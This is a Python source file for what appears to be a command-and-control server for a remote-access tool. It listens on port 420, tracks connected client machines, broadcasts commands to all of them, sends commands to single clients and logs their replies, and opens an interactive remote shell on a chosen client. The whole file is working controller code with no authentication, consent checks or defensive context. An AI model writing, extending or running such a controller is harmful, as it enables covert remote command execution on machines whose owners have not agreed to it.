import socket
import threading
import time as t
import logging as log
from datetime import datetime
import os

host = '' # intranet ip from server
port = 420

today = datetime.today()
now = datetime.now()
logfile = "logs/" + today.strftime("%Y.%m.%d") + "-" + now.strftime("%Hh%M.%S") + "_logs.log"

log.basicConfig(filename=logfile, format='%(asctime)s %(message)s', filemode='w')
logger = log.getLogger()
logger.setLevel(log.DEBUG)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen()

clients = []
adrs = []

def clearConsole():
    from os import system, name
    system('cls')

def broadcast(message):
    i = 0
    for client in clients:
        try:
            client.send(message.encode('utf-8'))
        except:
            logger.info("Disconnected from: " + adrs[i])
            clients.remove(client)
            adrs.pop(i)
        i = i+1
    return

def sendUnique(msg, address):
    matched_indexes = 0
    i = 0
    length = len(adrs)
    while i < length:
        if address == adrs[i]:
            matched_indexes = i
            break
        i += 1
    clients[int(matched_indexes)].send(msg.encode('utf-8'))

def accept_clients():
    while True:
        client, address = server.accept()
        clients.append(client)
        adrs.append(address[0])
        logger.info("Connected with " + str(address[0]))

thread_01 = threading.Thread(target=accept_clients)
thread_01.start()

t.sleep(2)

def check_client():
    while True:
        broadcast('ping')
        t.sleep(5)

thread_02 = threading.Thread(target=check_client)
thread_02.start()

def recv_cmd():
    while True:
        for client in clients:
            client_msg = client.recv(1024).decode('utf-8')
            print("recv msg:" + client_msg)

thread_03 = threading.Thread(target=recv_cmd)
# thread_03.start()

def get_client_callback(client_adrs):
    i = 0
    length = len(adrs)
    while i < length:
        if client_adrs == adrs[i]:
            callback_response = clients[int(i)].recv(1024).decode('utf-8')
            return callback_response
        i += 1

def openRemoteShell(addr):
    print("\"!exit\" to exit the remote Shell.")
    shell_path = "undifined"
    while True:
        shell_cmd = input(shell_path + ">")
        if shell_cmd == "!exit":
            return "Shell exited!"
        shell_cmd = "/cmd/" + shell_cmd + "/workdir/" + shell_path
        matched_indexes = 0
        i = 0
        length = len(adrs)
        while i < length:
            if addr == adrs[i]:
                matched_indexes = i
                break
            i += 1
        clients[int(matched_indexes)].send(shell_cmd.encode('utf-8'))
        shell_res = get_client_callback(addr)
        shell_res_partitioned_string = shell_res.partition('__docknext__')
        shell_path = shell_res_partitioned_string[0]
        print(shell_res_partitioned_string[2])

while True:
    print("\n<============MENU============>")
    print("List of Clients: 0")
    print("Broadcast Command: 1")
    print("Send Unique Command: 2")
    print("Open remote Shell: 3")
    choice = input("=>")
    clearConsole()
    if choice == "0":
        i = 0
        length = len(adrs)
        while i < length:
            print(adrs[i])
            i += 1
        print("Connected clients: " + str(length))
    if choice == "1":
        to_br_cmd = input("Command: ")
        try:
            broadcast(to_br_cmd)
            print("Command was successfully send!")
        except:
            print("A Error has occurred!")
    if choice == "2":
        i = 0
        length = len(adrs)
        print("Choose Client: ")
        while i < length:
            print(adrs[i] + ": " + str(i))
            i += 1
        client_num_choose = input('Client: ')
        logger.info("Choosed client: " + str(adrs[int(client_num_choose)]))
        tosend_cmd = input('Command: ')
        logger.info("Sended Command: " + tosend_cmd)
        try:
            sendUnique(tosend_cmd, adrs[int(client_num_choose)])
            print("Command was successfully send!")
            res = get_client_callback(adrs[int(client_num_choose)])
            logger.info("Client Response: " + res)
            print("\nClient Response:")
            print(res)
        except:
            print('Invalid query!')
    
    if choice == "3":
        i = 0
        length = len(adrs)
        print("Choose Client: ")
        while i < length:
            print(adrs[i] + ": " + str(i))
            i += 1
        client_num_choose = input('Client: ')
        try:
            res_status = openRemoteShell(adrs[int(client_num_choose)])
            print(res_status)
        except:
            print('Invalid query!')
    input()
    clearConsole()